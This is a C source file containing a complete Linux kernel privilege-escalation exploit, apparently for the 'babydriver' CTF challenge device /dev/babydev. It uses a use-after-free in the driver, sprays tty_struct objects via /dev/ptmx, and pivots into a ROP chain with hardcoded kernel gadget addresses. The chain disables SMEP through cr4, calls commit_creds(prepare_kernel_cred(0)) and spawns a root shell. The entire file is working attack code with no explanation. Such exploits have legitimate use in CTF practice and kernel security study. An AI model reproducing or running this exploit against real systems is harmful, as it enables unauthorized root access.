#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sched.h>
#include <errno.h>
#include <pty.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/sem.h>

typedef int __attribute__((regparm(3))) (*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds) 0xffffffff810a1420; // commit_creds
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) 0xffffffff810a1810; // prepare_kernel_cred

size_t vmlinux_base, offset;
size_t user_cs, user_ss, user_sp, user_rflags;
size_t raw_vmlinux_base = 0xffffffff81000000;

void save_status()
{
	__asm__(
	"mov user_cs, cs;"
	"mov user_ss, ss;"
	"mov user_sp, rsp;"
	"pushf;"
	"pop user_rflags;"
	);
	puts("[+] save the state success!");
}

void set_affinity(int which_cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(which_cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        puts("sched_setaffinity()");
        exit(0);
    }
}

void get_shell()
{
	if (getuid() == 0)
	{
		puts("[+] get root");
		//system("/bin/sh");
		char *shell = "/bin/sh";
		char *args[] = {shell, NULL};
		execve(shell, args, NULL);
	}
	else
	{
		puts("[-] get shell error");
		sleep(3);
		exit(0);
	}
}

void get_root(void)
{
	commit_creds(prepare_kernel_cred(0));
	//void *(*pkc)(int) = (void *(*)(int))prepare_kernel_cred;
	//void (*cc)(void *) = (void (*)(void *))commit_creds;
	//(*cc)((*pkc)(0));
}

int main()
{
	//signal(11, (size_t)get_shell);
	size_t rop[0x100] = {0};
	size_t user_buf[0x100] = {0};
	size_t fake_tty_struct[4] = {0};
	size_t fake_tty_operations[35] = {0};

	save_status();
	set_affinity(0);
	int fd1 = open("/dev/babydev", 2);
	int fd2 = open("/dev/babydev", 2);
	if(fd1 <0 || fd2 < 0)
	{
		puts("[-] open babydev error");
		sleep(3);
		exit(0);
	}

	ioctl(fd1, 0x10001, 0x2e0);
	close(fd1);

	int i = 0;
	rop[i++] = 0xffffffff810d238d; // pop rdi; ret;
	rop[i++] = 0x6f0;
	rop[i++] = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; ret;
	rop[i++] = 0;
	rop[i++] = (size_t)get_root;
	rop[i++] = 0xffffffff81063694; // swapgs; pop rbp; ret;
	rop[i++] = 0;
	rop[i++] = 0xffffffff814e35ef; // iretq; ret;
	rop[i++] = (size_t)get_shell;
	rop[i++] = user_cs;
	rop[i++] = user_rflags;
	rop[i++] = user_sp;
	rop[i++] = user_ss;

	fake_tty_operations[12] = 0xffffffff81007808; // xchg eax, esp; ret;

	
	size_t fake_stack = 0xffffffff81007808 & 0xffffffff;
	size_t mmap_base = fake_stack & 0xfffff000;
	
	if(mmap((void *)mmap_base, 0x30000, 7, 0x22, -1, 0) != (void *)mmap_base)
		{
			puts("[-] mmap error");
			sleep(3);
			exit(0);
		}
	else
		puts("[+] mmap success");

	memcpy((void *)fake_stack, rop, sizeof(rop));

	int fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY);
	if(fd_tty < 0)
	{
		puts("[-] open ptmx error");
		sleep(3);
		exit(0);
	}

	read(fd2, fake_tty_struct, 32);
	fake_tty_struct[3] = (size_t)fake_tty_operations;

	write(fd2, fake_tty_struct, 32);

	ioctl(fd_tty, 0, 0);
	return 0;
}
